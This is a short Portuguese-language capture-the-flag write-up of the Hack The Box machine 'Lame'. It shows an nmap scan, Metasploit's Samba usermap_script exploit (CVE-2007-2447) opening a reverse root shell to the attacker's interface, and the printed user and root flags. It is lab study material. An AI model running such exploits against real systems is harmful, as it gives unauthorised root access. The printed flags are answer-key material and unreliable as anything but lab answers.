---
title: "Lame"
date: 2024-01-10
type: "labs"
difficulty: "Easy"
pwned: true
tags: ["smb", "metasploit", "linux", "samba"]
summary: "Máquina clássica do HTB — exploita CVE no Samba para RCE como root direto."
machine_info:
  OS: Linux
  IP: 10.10.10.3
  Dificuldade: Easy
  CVE: CVE-2007-2447
---

## Reconhecimento

```bash
$ nmap -sV -sC 10.10.10.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
139/tcp open  netbios-ssn Samba smbd 3.0.20
445/tcp open  microsoft-ds Samba smbd 3.0.20
```

## Exploração — Samba usermap_script

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit > set RHOSTS 10.10.10.3
msf6 exploit > set LHOST tun0
msf6 exploit > run

[*] Command shell session 1 opened
# whoami
root
```

## Flags

```bash
# cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5

# cat /root/root.txt
92caac3be140ef409e45721348a4e9df
```
